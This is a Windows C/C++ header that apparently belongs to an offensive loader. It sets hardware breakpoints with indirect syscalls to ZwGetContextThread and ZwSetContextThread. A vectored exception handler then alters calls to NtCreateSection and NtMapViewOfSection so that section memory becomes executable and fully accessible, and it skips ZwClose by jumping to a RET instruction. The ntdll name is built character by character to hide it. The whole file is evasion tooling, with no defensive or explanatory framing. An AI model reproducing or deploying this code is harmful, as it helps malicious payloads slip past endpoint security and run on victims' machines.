#pragma once

#include <Windows.h>
#include "syscalls.h"

#define SET_DR_REGISTER(ctx, index, addr) \
    do { \
        switch (index) { \
            case 0: (ctx).Dr0 = (DWORD64)(addr); break; \
            case 1: (ctx).Dr1 = (DWORD64)(addr); break; \
            case 2: (ctx).Dr2 = (DWORD64)(addr); break; \
            case 3: (ctx).Dr3 = (DWORD64)(addr); break; \
            default: break; \
        } \
    } while(0)


typedef enum {
    DR0 = 0,
    DR1 = 1,
    DR2 = 2,
    DR3 = 3,
} DrIndex;


//retrieve syscall instructions address
PBYTE ret_RET_addr(PBYTE func_addr) {

    int emergencybreak = 0;
    while (emergencybreak < 2048) {
        //taking into account indianess crazyness
        if (func_addr[0] == 0xc3) {

            return func_addr;
        }
        func_addr++;
        emergencybreak++;
    }
    return NULL;
}


/*--------------HARDWARE BREAKPOINT MANAGEMENT---------------------*/


unsigned long long set_dr7_bit(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, unsigned long long NewBitValue) {
    unsigned long long mask = (1UL << NmbrOfBitsToModify) - 1UL;
    unsigned long long NewDr7Register = (CurrentDr7Register & ~(mask << StartingBitPosition)) | (NewBitValue << StartingBitPosition);

    return NewDr7Register;
}

VOID NtMapViewOfSectionDetour(PCONTEXT pThreadCtx) {


    *(ULONG_PTR*)(pThreadCtx->Rsp + 80) = PAGE_EXECUTE_READWRITE;

    pThreadCtx->EFlags = pThreadCtx->EFlags | (1 << 16);
}

VOID NtCreateSectionDetour(PCONTEXT pThreadCtx) {


    pThreadCtx->Rdx = SECTION_ALL_ACCESS;

    pThreadCtx->EFlags = pThreadCtx->EFlags | (1 << 16);
}

VOID ZwCloseDetour(PCONTEXT pThreadCtx) {

    //need to find the address of a C3 instruction within an executable memory range
    pThreadCtx->Rip = (ULONG_PTR)ret_RET_addr((PBYTE)ZwCloseDetour);
    //resuming the execution
    pThreadCtx->EFlags = pThreadCtx->EFlags | (1 << 16);
}


VOID unset_hwbp(DrIndex index)
{
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    SYSCALL_ENTRY zw_func_s[AmountofSyscalls] = { 0 };
    WCHAR wstr_ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
    retrieve_zw_func_s(GMHR(wstr_ntdll), zw_func_s);

    ZwGetContextThread(
        (HANDLE)-2,
        &ctx,
        zw_func_s[ZwGetContextThreadF].SSN,
        zw_func_s[ZwGetContextThreadF].sysretAddr
	);

    SET_DR_REGISTER(ctx, index, 0x00);

    ctx.Dr7 = set_dr7_bit(ctx.Dr7, index << 1, 1, 0);

    ZwSetContextThread(
        (HANDLE)-2,
        &ctx,
        zw_func_s[ZwSetContextThreadF].SSN,
        zw_func_s[ZwSetContextThreadF].sysretAddr
	);

}

VOID set_hwbp(DrIndex index, PVOID addr, PSYSCALL_ENTRY zw_func_s)
{
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    ZwGetContextThread(
        (HANDLE)-2,
        &ctx,
        zw_func_s[ZwGetContextThreadF].SSN,
        zw_func_s[ZwGetContextThreadF].sysretAddr
	);

    SET_DR_REGISTER(ctx, index, addr);

    ctx.Dr7 = set_dr7_bit(ctx.Dr7, index << 1, 1, 1);

    ZwSetContextThread(
        (HANDLE)-2,
        &ctx,
        zw_func_s[ZwSetContextThreadF].SSN,
        zw_func_s[ZwSetContextThreadF].sysretAddr
	);
}


LONG WINAPI VectorHandler(PEXCEPTION_POINTERS exception_info) {

    //(ZwCloseAddress, NtMapViewOfSectionAddress, NtCreateSectionAddress);
    if (exception_info->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {

        if (exception_info->ExceptionRecord->ExceptionAddress == (PVOID)exception_info->ContextRecord->Dr1) {

            unset_hwbp(DrIndex::DR1);

            ZwCloseDetour(exception_info->ContextRecord);

            return EXCEPTION_CONTINUE_EXECUTION;

        }


        if (exception_info->ExceptionRecord->ExceptionAddress == (PVOID)exception_info->ContextRecord->Dr2) {

            unset_hwbp(DrIndex::DR2);

            NtMapViewOfSectionDetour(exception_info->ContextRecord);

            return EXCEPTION_CONTINUE_EXECUTION;

        }

        if (exception_info->ExceptionRecord->ExceptionAddress == (PVOID)exception_info->ContextRecord->Dr3) {

            unset_hwbp(DrIndex::DR3);

            NtCreateSectionDetour(exception_info->ContextRecord);

            return EXCEPTION_CONTINUE_EXECUTION;

        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

